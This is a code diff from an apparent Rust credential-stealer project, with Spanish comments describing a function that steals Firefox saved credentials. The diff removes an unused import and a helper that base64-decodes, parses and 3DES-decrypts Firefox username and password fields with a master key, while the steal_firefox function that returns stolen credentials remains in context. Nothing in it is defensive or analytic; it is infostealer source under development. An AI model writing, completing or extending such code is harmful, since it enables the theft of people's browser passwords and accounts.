@@ -2,7 +2,6 @@
 use crate::stealer::{Credential, StealerError, StealerResult};
 use crate::stealer::common::{get_appdata_roaming, file_exists, base64_decode};
 use std::path::PathBuf;
-use rusqlite::Connection;
 
 /// Roba credenciales de Firefox
 pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
@@ -147,21 +146,4 @@ fn extract_json_field(json: &str, field: &str) -> Option<String> {
         }
     }
     None
-}
-
-/// Desencripta un campo de Firefox (username o password)
-fn decrypt_firefox_field(encrypted_b64: &str, master_key: &[u8]) -> StealerResult<String> {
-    // Decodificar Base64
-    let encrypted = base64_decode(encrypted_b64)
-        .map_err(|_| StealerError::Base64Error)?;
-    
-    // Parsear ASN.1 para obtener IV y ciphertext
-    let (iv, ciphertext) = parse_asn1_sequence(&encrypted)?;
-    
-    // Desencriptar con 3DES-CBC
-    let decrypted = decrypt_3des_cbc(&ciphertext, master_key, &iv)?;
-    
-    // Convertir a string
-    String::from_utf8(decrypted)
-        .map_err(|_| StealerError::InvalidData)
 }
